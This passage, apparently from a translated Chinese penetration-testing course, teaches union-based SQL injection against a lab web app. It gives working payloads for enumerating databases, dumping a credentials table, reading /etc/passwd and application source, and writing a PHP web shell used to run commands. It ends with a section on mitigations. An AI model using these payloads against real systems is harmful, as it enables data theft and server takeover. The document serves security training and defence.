如我们所见，我们可以获得显示的数据库版本。现在我们知道如何形成我们的 Union SQL 注入有效负载，以成功地获得打印在页面上的查询输出。在下一节中，我们将讨论如何枚举数据库并从其他表和数据库中获取数据。

## 0x09 数据库枚举

在前面的部分中，我们了解了不同的 SQL 查询`MySQL`和 SQL 注入以及如何使用它们。本节将使用所有这些，并在 SQL 注入中使用 SQL 查询从数据库中收集数据。

------

### MySQL指纹识别

在枚举数据库之前，我们通常需要确定我们正在处理的 DBMS 类型。这是因为每个 DBMS 都有不同的查询，知道它是什么将帮助我们知道使用什么查询。

作为初步猜测，如果我们在 HTTP 响应中看到的 Web 服务器是`Apache`或`Nginx`，则可以很好地猜测该 Web 服务器正在 Linux 上运行，因此 DBMS 很可能是`MySQL`。如果网络服务器是，这同样也适用于 Microsoft DBMS `IIS`，所以它很可能是`MSSQL`。然而，这是一个牵强附会的猜测，因为许多其他数据库可以在操作系统或 Web 服务器上使用。因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。

正如我们`MySQL`在本模块中介绍的那样，让我们使用指纹`MySQL`数据库。以下查询及其输出将告诉我们我们正在处理`MySQL`：

| 有效载荷           | 何时使用                 | 预期产出                                | 输出错误                                         |
| ------------------ | ------------------------ | --------------------------------------- | ------------------------------------------------ |
| `SELECT @@version` | 当我们有完整的查询输出时 | MySQL版本'即`10.3.22-MariaDB-1ubuntu1`' | 在 MSSQL 中，它返回 MSSQL 版本。其他 DBMS 出错。 |
| `SELECT POW(1,1)`  | 当我们只有数字输出时     | `1`                                     | 其他 DBMS 出错                                   |
| `SELECT SLEEP(5)`  | 盲/无输出                | 延迟页面响应 5 秒并返回`0`。            | 不会延迟与其他 DBMS 的响应                       |

正如我们在上一节的示例中看到的，当我们尝试时`@@version`，它给了我们：

![img](https://p.ipic.vip/vejupm.jpg)

输出`10.3.22-MariaDB-1ubuntu1`意味着我们正在处理`MariaDB`类似于 MySQL 的 DBMS。由于我们有直接的查询输出，因此我们不必测试其他有效载荷。相反，我们可以测试它们，看看我们得到了什么。

------

### INFORMATION_SCHEMA 数据库

要使用从表中提取数据`UNION SELECT`，我们需要正确地形成我们的`SELECT`查询。为此，我们需要以下信息：

- 数据库列表
- 每个数据库中的表列表
- 每个表中的列列表

有了以上信息，我们就可以形成我们的`SELECT`语句，从 DBMS 内的任何数据库中的任何表中的任何列中转储数据。这是我们可以使用`INFORMATION_SCHEMA`数据库的地方。

INFORMATION_SCHEMA数据库包含有关服务器上存在[的](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html)数据库和表的元数据。该数据库在利用 SQL 注入漏洞时起着至关重要的作用。由于这是一个不同的数据库，我们不能直接用语句调用它的表`SELECT`。如果我们只为语句指定一个表的名称`SELECT`，它将在同一数据库中查找表。

因此，要引用另一个数据库中存在的表，我们可以使用点 ' `.`' 运算符。例如，对于名为 的数据库中存在的`SELECT`表，我们可以使用：`users``my_database`

```sql
SELECT * FROM my_database.users;
```

同样，我们可以查看`INFORMATION_SCHEMA`数据库中存在的表。

------

### 图式

要开始我们的枚举，我们应该找到 DBMS 上可用的数据库。数据库中的表[SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)`INFORMATION_SCHEMA`包含有关服务器上所有数据库的信息。它用于获取数据库名称，以便我们可以查询它们。该`SCHEMA_NAME`列包含当前存在的所有数据库名称。

让我们先在本地数据库上测试一下，看看查询是如何使用的：

```shell-session
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

我们看到了`ilfreight`和`dev`数据库。

注意：前三个数据库是默认的 MySQL 数据库，并且存在于任何服务器上，因此我们通常在数据库枚举时忽略它们。有时还有第四个“系统”数据库。

现在，让我们使用`UNION`SQL 注入来执行相同的操作，并使用以下有效负载：

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

![img](https://p.ipic.vip/tsychv.png)

除了默认数据库之外，我们再次看到两个数据库，`ilfreight`和。`dev`让我们找出 Web 应用程序正在运行的数据库以从中检索端口数据。我们可以通过查询找到当前数据库`SELECT database()`。我们可以像在上一节中查找 DBMS 版本的方式一样执行此操作：

```sql
cn' UNION select 1,database(),2,3-- -
```

![img](https://p.ipic.vip/4zwupa.jpg)

我们看到数据库名称是`ilfreight`. 然而，另一个数据库 ( `dev`) 看起来很有趣。因此，让我们尝试从中检索表格。

------

### 桌子

在我们从数据库中转储数据之前`dev`，我们需要获取表的列表以使用`SELECT`语句查询它们。要查找数据库中的所有表，我们可以使用数据库`TABLES`中的表`INFORMATION_SCHEMA`。

[TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)表包含有关整个数据库中所有表的信息。该表包含多个列，但我们对`TABLE_SCHEMA`和`TABLE_NAME`列感兴趣。列`TABLE_NAME`存储表名，而`TABLE_SCHEMA`列指向每个表所属的数据库。这可以类似于我们找到数据库名称的方式来完成。例如，我们可以使用以下有效负载来查找`dev`数据库中的表：

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

请注意我们如何用“TABLE_NAME”和“TABLE_SCHEMA”替换数字“2”和“3”，以获取同一查询中两列的输出。

![img](https://p.ipic.vip/h240uh.png)

注意：我们添加了一个 (where table_schema='dev') 条件来只返回来自 'dev' 数据库的表，否则我们会得到所有数据库中的所有表，这可能有很多。

我们在 dev 数据库中看到四个表，即`credentials`、`framework`、`pages`和`posts`。例如，该`credentials`表可能包含要查看的敏感信息。

------

### 列

要转储表的数据`credentials`，首先要找到表中的列名，可以在数据库`COLUMNS`中的表中找到`INFORMATION_SCHEMA`。COLUMNS表包含有关所有数据库中存在的所有列的信息[。](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)这有助于我们找到查询表的列名。、和列可用于实现此目的`COLUMN_NAME`。正如我们之前所做的那样，让我们尝试使用此有效负载来查找表中的列名：`TABLE_NAME``TABLE_SCHEMA``credentials`

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  
```

![img](https://p.ipic.vip/i7lof8.jpg)

该表有两列，名为`username`和`password`。我们可以使用此信息并从表中转储数据。

------

### 数据

现在我们有了所有的信息，我们可以形成我们的查询来从数据库中的表中`UNION`转储`username`和`password`列的数据。我们可以用and代替第 2 列和第 3 列：`credentials``dev``username``password`

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

请记住：不要忘记使用点运算符来引用“开发”数据库中的“凭据”，因为我们在“ilfreight”数据库中运行，如前所述。

![img](https://p.ipic.vip/n9oypj.png)

我们能够获取`credentials`表中的所有条目，其中包含密码哈希和 API 密钥等敏感信息。

## 0x10 读取文件

除了从 DBMS 中的各种表和数据库中收集数据外，SQL 注入还可以用于执行许多其他操作，例如在服务器上读取和写入文件，甚至在后端服务器上获得远程代码执行。

------

### 特权

读取数据比写入数据更为常见，在现代 DBMS 中，写入数据严格保留给特权用户使用，因为它会导致系统利用，正如我们将看到的那样。例如，在 中`MySQL`，DB 用户必须有权`FILE`将文件的内容加载到表中，然后从该表中转储数据并读取文件。因此，让我们从收集有关我们在数据库中的用户权限的数据开始，以决定我们是否将文件读取和/或写入后端服务器。

##### 数据库用户

首先，我们必须确定我们在数据库中是哪个用户。虽然我们不一定需要数据库管理员 (DBA) 权限来读取数据，但在现代 DBMS 中这变得越来越需要，因为只有 DBA 才被授予此类权限。这同样适用于其他常见的数据库。如果我们确实拥有 DBA 权限，那么我们更有可能拥有文件读取权限。如果我们不这样做，那么我们必须检查我们的特权，看看我们能做什么。为了能够找到我们当前的数据库用户，我们可以使用以下任何查询：

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

我们的`UNION`注入有效载荷如下：

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

或者：

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

这告诉我们我们当前的用户，在这种情况下是`root`：

![img](https://p.ipic.vip/mt3xp0.jpg)

这是非常有前途的，因为根用户很可能是 DBA，这给了我们很多特权。

##### 用户权限

现在我们知道了我们的用户，我们可以开始寻找我们对那个用户有什么特权。首先，我们可以通过以下查询来测试我们是否拥有超级管理员权限：

```sql
SELECT super_priv FROM mysql.user
```

再一次，我们可以在上述查询中使用以下有效负载：

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

如果我们在 DBMS 中有很多用户，我们可以添加`WHERE user="root"`只显示当前用户的权限`root`：

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -  
```

![img](https://p.ipic.vip/d6y0ff.jpg)

查询返回`Y`，这意味着`YES`，表示超级用户权限。我们还可以使用以下查询直接从模式中转储我们拥有的其他特权：

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

再一次，我们可以添加`WHERE user="root"`以仅显示我们当前的用户`root`权限。我们的有效载荷将是：

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
```

我们看到了所有可能赋予我们当前用户的权限：

![img](https://p.ipic.vip/yv5vct.jpg)

我们看到`FILE`为我们的用户列出了权限，使我们能够读取文件甚至可能写入文件。因此，我们可以继续尝试读取文件。

------

### 加载文件

现在我们知道我们有足够的权限来读取本地系统文件，让我们使用函数来做到这一点`LOAD_FILE()`。LOAD_FILE [()](https://mariadb.com/kb/en/load_file/)函数可用于 MariaDB / MySQL 从文件中读取数据。该函数只接受一个参数，即文件名。以下查询是如何读取文件的示例`/etc/passwd`：

```sql
SELECT LOAD_FILE('/etc/passwd');
```

注意：如果运行 MySQL 的 OS 用户有足够的权限读取文件，我们将只能读取该文件。

类似于我们一直使用`UNION`注入的方式，我们可以使用上面的查询：

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

![img](https://p.ipic.vip/pukwyf.png)

我们能够通过SQL注入成功读取到passwd文件的内容。不幸的是，这也可能被用来泄露应用程序源代码。

------

### 另一个例子

我们知道当前页面是`search.php`。默认的 Apache webroot 是`/var/www/html`. 让我们尝试阅读文件的源代码`/var/www/html/search.php`。

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

![img](https://p.ipic.vip/1alxqy.png)

但是，该页面最终会在浏览器中呈现 HTML 代码。可以通过点击查看 HTML 源代码`[Ctrl + U]`。

![加载文件源](https://p.ipic.vip/e0u51d.png)

源代码向我们展示了完整的 PHP 代码，可以对其进行进一步检查以查找敏感信息（如数据库连接凭据）或查找更多漏洞。

## 0x11 写入文件

当涉及到将文件写入后端服务器时，它在现代 DBMS 中变得更加受限，因为我们可以利用它在远程服务器上编写一个 web shell，从而执行代码并接管服务器。这就是现代 DBMS 默认禁用文件写入并要求 DBA 具有某些权限才能写入文件的原因。在写文件之前，我们首先要检查自己是否有足够的权限，DBMS是否允许写文件。

------

### 写文件权限

为了能够使用 MySQL 数据库将文件写入后端服务器，我们需要三件事：

1. `FILE`启用权限的用户
2. `secure_file_priv`未启用MySQL 全局变量
3. 对后端服务器上我们要写入的位置的写入权限

我们已经发现我们的当前用户具有`FILE`写入文件所需的权限。我们现在必须检查 MySQL 数据库是否具有该权限。这可以通过检查全局变量来完成`secure_file_priv`。

##### secure_file_priv

[secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)变量用于确定从何处读取/写入文件。一个空值可以让我们从整个文件系统中读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取。另一方面，`NULL`意味着我们不能从任何目录读/写。MariaDB 将此变量默认设置为空，如果用户有权限，这允许我们读/写任何文件`FILE`。但是，`MySQL`用作`/var/lib/mysql-files`默认文件夹。这意味着`MySQL`使用默认设置无法通过注入读取文件。更糟糕的是，一些现代配置默认为`NULL`，这意味着我们无法在系统内的任何地方读取/写入文件。

那么，让我们看看如何找出 的值`secure_file_priv`。在 中`MySQL`，我们可以使用以下查询来获取此变量的值：

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

但是，由于我们正在使用`UNION`注入，因此我们必须使用语句来获取值`SELECT`。这应该不是问题，因为所有变量和大多数配置都存储在`INFORMATION_SCHEMA`数据库中。`MySQL`全局变量存储在一个名为[global_variables 的](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html)表中，根据文档，该表有两列`variable_name`和`variable_value`。

我们必须从`INFORMATION_SCHEMA`数据库中的那个表中选择这两列。MySQL 配置中有数百个全局变量，我们不想检索所有这些变量。`secure_file_priv`然后，我们将使用`WHERE`我们在上一节中学到的子句过滤结果以仅显示变量。

最终的 SQL 查询如下：

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

因此，与其他注入查询类似`UNION`，我们可以使用以下 payload 获得上述查询结果。请记住再添加两列`1`&`4`作为垃圾数据，总共有 4 列'：

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![img](https://p.ipic.vip/h557d4.jpg)

结果显示该`secure_file_priv`值为空，这意味着我们可以将文件读/写到任何位置。

------

### 选择进入 OUTFILE

现在我们已经确认我们的用户应该将文件写入后端服务器，让我们尝试使用语句来做到这一点`SELECT .. INTO OUTFILE`。SELECT [INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/)语句可用于将来自选择查询的数据写入文件。这通常用于从表中导出数据。

要使用它，我们可以`INTO OUTFILE '...'`在查询之后添加以将结果导出到我们指定的文件中。下面的示例将表的输出保存`users`到文件中`/tmp/credentials`：

 secure_file_priv

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

如果我们转到后端服务器和`cat`文件，我们会看到该表的内容：

 secure_file_priv

```shell-session
sl1aun@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

也可以直接将`SELECT`字符串写入文件，让我们可以向后端服务器写入任意文件。

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

当我们`cat`打开文件时，我们会看到该文本：

 secure_file_priv

```shell-session
sl1aun@htb[/htb]$ cat /tmp/test.txt 

this is a test
```

 secure_file_priv

```shell-session
sl1aun@htb[/htb]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

正如我们在上面看到的，该`test.txt`文件已成功创建并归`mysql`用户所有。

提示：高级文件导出利用“FROM_BASE64("base64_data")”函数，以便能够写入长文件/高级文件，包括二进制数据。

------

### 通过 SQL 注入写入文件

让我们尝试向 webroot 写入一个文本文件并验证我们是否具有写入权限。下面的查询应该写入`file written successfully!`文件`/var/www/html/proof.txt`，然后我们可以在 Web 应用程序上访问该文件：

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

**注意：**要编写 web shell，我们必须知道 web 服务器的基本 web 目录（即 web root）。找到它的一种方法是使用`load_file`读取服务器配置，例如在 找到 Apache 的配置`/etc/apache2/apache2.conf`，在 找到 Nginx 的配置`/etc/nginx/nginx.conf`，或者在 找到 IIS 配置`%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`，或者我们可以在线搜索其他可能的配置位置。此外，我们可能会运行模糊扫描并尝试将文件写入不同的可能的 Web 根目录，使用[这个 Linux 的词表](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)或[这个 Windows 的词表](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)。最后，如果以上方法都不起作用，我们可以使用显示给我们的服务器错误并尝试以这种方式找到 web 目录。

注入`UNION`有效载荷如下：

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

![img](https://p.ipic.vip/hkrsmg.png)

我们在页面上没有看到任何错误，这表明查询成功了。`proof.txt`检查webroot 中的文件，我们看到它确实存在：

![img](https://p.ipic.vip/40z8r3.png)

注意：我们看到我们转储的字符串以及前面的“1”、“3”和后面的“4”。这是因为整个“UNION”查询结果都写入了文件。为了使输出更清晰，我们可以使用 "" 而不是数字。

------

### 编写网络外壳

确认写入权限后，我们可以继续将 PHP web shell 写入 webroot 文件夹。我们可以编写如下的PHP webshell来直接在后台服务器上执行命令：

```php
<?php system($_REQUEST[0]); ?>
```

我们可以重用我们之前的`UNION`注入载荷，并将字符串更改为上面的字符串，并将文件名更改为`shell.php`：

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

  ', “ “, “ “ 进入输出文件 '/var/www/html/shell.php'-- -'>

![img](https://p.ipic.vip/ur051n.png)

再一次，我们没有看到任何错误，这意味着文件写入可能有效。`/shell.php`这可以通过浏览到文件并通过参数执行命令来验证`0`，`?0=id`在我们的 URL 中：

![img](https://p.ipic.vip/2kzupt.png)

该`id`命令的输出确认我们执行了代码并以用户身份运行`www-data`。

## 0x12 缓解 SQL 注入

------

我们已经了解了 SQL 注入、它们发生的原因以及我们如何利用它们。我们还应该学习如何在我们的代码中避免这些类型的漏洞，并在发现它们时对其进行修补。让我们看一些如何缓解 SQL 注入的示例。

------

### 输入消毒

这是我们之前讨论的身份验证绕过部分的代码片段：

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
  echo "Executing query: " . $query . "<br /><br />";

  if (!mysqli_query($conn ,$query))
  {
          die('Error: ' . mysqli_error($conn));
  }

  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
<SNIP>
```

正如我们所看到的，脚本从 POST 请求中获取 和 并将其直接传递给查询`username`。`password`这将使攻击者可以注入他们想要的任何东西并利用该应用程序。可以通过清理任何用户输入来避免注入，使注入的查询无用。库提供了多种函数来实现这一点，一个这样的例子是[mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)函数。此函数对诸如`'`and之类的字符进行转义`"`，因此它们没有任何特殊含义。

```php
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
```

上面的代码片段显示了如何使用该函数。

![mysqli_escape](https://p.ipic.vip/chzyde.png)

正如预期的那样，由于转义了单引号，注入不再有效。一个类似的例子是用于转义 PostgreSQL 查询的[pg_escape_string() 。](https://www.php.net/manual/en/function.pg-escape-string.php)

------

### 输入验证

还可以根据用于查询的数据验证用户输入，以确保它与预期输入相匹配。例如，当将电子邮件作为输入时，我们可以验证输入的形式是`...@email.com`，等等。

考虑端口页面中的以下代码片段，我们`UNION`在其中使用了注入：

```php
<?php
if (isset($_GET["port_code"])) {
	$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
	$result = pg_query($conn,$q);
    
	if (!$result)
	{
   		die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
	}
<SNIP>
?>
```

`port_code`我们看到直接在查询中使用了GET 参数。众所周知，端口号仅由字母或空格组成。我们可以将用户输入限制为仅这些字符，这将防止注入查询。正则表达式可用于验证输入：

```php
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```

代码被修改为使用[preg_match()](https://www.php.net/manual/en/function.preg-match.php)函数，该函数检查输入是否与给定模式匹配。使用的模式是`[A-Za-z\s]+`，它将只匹配包含字母和空格的字符串。任何其他字符都将导致脚本终止。

![img](https://p.ipic.vip/xgrdd8.png)

我们可以测试下面的注入：

```sql
'; SELECT 1,2,3,4-- -
```

![img](https://p.ipic.vip/xgrdd8.png)

如上图所示，注入查询的输入被服务器拒绝。

------

### 用户权限

正如最初讨论的那样，DBMS 软件允许创建具有细粒度权限的用户。我们应该确保查询数据库的用户只有最小权限。

超级用户和具有管理权限的用户永远不应该与 Web 应用程序一起使用。这些帐户可以访问可能导致服务器受损的功能和特性。

```shell-session
MariaDB [(none)]> CREATE USER 'reader'@'localhost';

Query OK, 0 rows affected (0.002 sec)


MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';

Query OK, 0 rows affected (0.000 sec)
```

上面的命令添加了一个名为 who 的新 MariaDB 用户，`reader`该用户仅被授予`SELECT`表的权限`ports`。我们可以通过登录验证该用户的权限：

```shell-session
sl1aun@htb[/htb]$ mysql -u reader -p

MariaDB [(none)]> use ilfreight;
MariaDB [ilfreight]> SHOW TABLES;

+---------------------+
| Tables_in_ilfreight |
+---------------------+
| ports               |
+---------------------+
1 row in set (0.000 sec)


MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| ilfreight          |
+--------------------+
2 rows in set (0.000 sec)


MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
```

上面的代码片段确认`reader`用户无法查询`ilfreight`数据库中的其他表。用户只能访问`ports`应用程序所需的表。

------

### Web 应用防火墙

Web 应用程序防火墙 (WAF) 用于检测恶意输入并拒绝包含它们的任何 HTTP 请求。即使应用程序逻辑存在缺陷，这也有助于防止 SQL 注入。WAF 可以是开源的 (ModSecurity) 或高级的 (Cloudflare)。他们中的大多数都有基于常见网络攻击配置的默认规则。例如，任何包含该字符串的请求`INFORMATION_SCHEMA`都将被拒绝，因为它通常在利用 SQL 注入时使用。

------

### 参数化查询

另一种确保输入被安全清理的方法是使用参数化查询。参数化查询包含输入数据的占位符，然后由驱动程序转义并传递。我们不是直接将数据传递到 SQL 查询，而是使用占位符，然后用 PHP 函数填充它们。

考虑以下修改后的代码：

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```

查询被修改为包含两个占位符，标有用`?`户名和密码的放置位置。[然后我们使用mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php)函数将用户名和密码绑定到查询。这将安全地转义任何引号并将值放入查询中。

------

### 结论

上面的列表并不详尽，仍然可以根据应用程序逻辑利用 SQL 注入。显示的代码示例基于 PHP，但逻辑适用于所有常见语言和库。

